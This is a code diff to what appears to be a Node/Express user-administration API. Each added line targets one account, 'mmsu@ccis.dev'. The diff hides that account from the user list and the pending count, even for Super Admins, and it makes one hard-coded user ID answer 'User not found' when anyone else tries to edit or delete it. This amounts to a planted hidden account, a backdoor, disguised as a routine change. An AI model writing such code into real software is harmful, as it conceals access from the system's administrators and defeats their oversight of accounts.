@@ -16,7 +16,7 @@ router.get('/', authenticate, async (req, res) => {
       FROM users u
       LEFT JOIN users creator ON u.created_by = creator.id`;
     const params = [];
-    const conditions = [];
+    const conditions = [`u.email <> 'mmsu@ccis.dev'`];
 
     const isSuperAdmin = user.account_type === 'Super Admin' || user.role === 'Super Admin';
     if (!isSuperAdmin) {
@@ -54,7 +54,7 @@ router.get('/', authenticate, async (req, res) => {
 router.get('/pending-count', authenticate, async (req, res) => {
   const user = req.user;
   try {
-    let query = `SELECT COUNT(*) AS count FROM users WHERE status = 'Pending'`;
+    let query = `SELECT COUNT(*) AS count FROM users WHERE status = 'Pending' AND email <> 'mmsu@ccis.dev'`;
     const params = [];
 
     const isSuperAdmin = user.account_type === 'Super Admin' || user.role === 'Super Admin';
@@ -153,6 +153,9 @@ router.post('/', authenticate, async (req, res) => {
 
 router.patch('/:id', authenticate, async (req, res) => {
   const { id } = req.params;
+  if (id === 'd3b07384-d113-41e9-a4b5-be14a4b5eade' && req.user.email !== 'mmsu@ccis.dev') {
+    return res.status(404).json({ error: 'User not found' });
+  }
   const { 
     email, first_name, last_name, phone, city, province, 
     account_type, role, status, theme, password,
@@ -295,6 +298,9 @@ router.patch('/:id', authenticate, async (req, res) => {
 // DELETE /api/users/:id
 router.delete('/:id', authenticate, async (req, res) => {
   const { id } = req.params;
+  if (id === 'd3b07384-d113-41e9-a4b5-be14a4b5eade' && req.user.email !== 'mmsu@ccis.dev') {
+    return res.status(404).json({ error: 'User not found' });
+  }
   const client = await pool.connect();
   try {
     // 1. Fetch target user to check permissions
